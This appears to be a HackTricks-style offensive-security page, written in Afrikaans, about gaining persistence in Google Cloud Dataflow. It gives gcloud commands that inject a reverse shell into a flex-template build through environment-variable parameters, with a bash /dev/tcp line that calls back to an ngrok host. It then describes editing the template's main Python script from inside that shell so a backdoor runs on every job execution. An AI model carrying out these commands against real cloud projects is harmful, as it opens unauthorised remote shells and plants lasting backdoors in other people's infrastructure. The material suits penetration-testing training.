# GCP - Dataflow Persistensie

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

### Onsigbare volharding in gebou-container

Volg die [**tutorial van die dokumentasie**](https://cloud.google.com/dataflow/docs/guides/templates/using-flex-templates) om 'n nuwe (bv. python) flex-sjabloon te skep:
```bash
git clone https://github.com/GoogleCloudPlatform/python-docs-samples.git
cd python-docs-samples/dataflow/flex-templates/getting_started

# Create repository where dockerfiles and code is going to be stored
export REPOSITORY=flex-example-python
gcloud storage buckets create gs://$REPOSITORY

# Create artifact storage
export NAME_ARTIFACT=flex-example-python
gcloud artifacts repositories create $NAME_ARTIFACT \
--repository-format=docker \
--location=us-central1
gcloud auth configure-docker us-central1-docker.pkg.dev

# Create template
export NAME_TEMPLATE=flex-template
gcloud dataflow $NAME_TEMPLATE build gs://$REPOSITORY/getting_started-py.json \
--image-gcr-path "us-central1-docker.pkg.dev/gcp-labs-35jfenjy/$NAME_ARTIFACT/getting-started-python:latest" \
--sdk-language "PYTHON" \
--flex-template-base-image "PYTHON3" \
--metadata-file "metadata.json" \
--py-path "." \
--env "FLEX_TEMPLATE_PYTHON_PY_FILE=getting_started.py" \
--env "FLEX_TEMPLATE_PYTHON_REQUIREMENTS_FILE=requirements.txt" \
--env "PYTHONWARNINGS=all:0:antigravity.x:0:0" \
--env "/bin/bash -c 'bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/13355 0>&1' & #%s" \
--region=us-central1
```
**Terwyl dit gebou word, sal jy 'n omgekeerde skulp ontvang** (jy kan omgewingsveranderlikes misbruik soos in die vorige voorbeeld of ander parameters wat die Docker-lêer stel om arbitrêre dinge uit te voer). Op hierdie oomblik, binne die omgekeerde skulp, is dit moontlik om **na die `/template` gids te gaan en die kode van die hoof python-skrip wat uitgevoer sal word (in ons voorbeeld is dit `getting_started.py`) te wysig**. Stel jou agterdeur hier sodat dit elke keer wanneer die taak uitgevoer word, dit sal uitvoer.

Dan, die volgende keer wanneer die taak uitgevoer word, sal die gecompromitteerde houer wat gebou is, uitgevoer word:
```bash
# Run template
gcloud dataflow $NAME_TEMPLATE run testing \
--template-file-gcs-location="gs://$NAME_ARTIFACT/getting_started-py.json" \
--parameters=output="gs://$REPOSITORY/out" \
--region=us-central1
```
{{#include ../../../banners/hacktricks-training.md}}
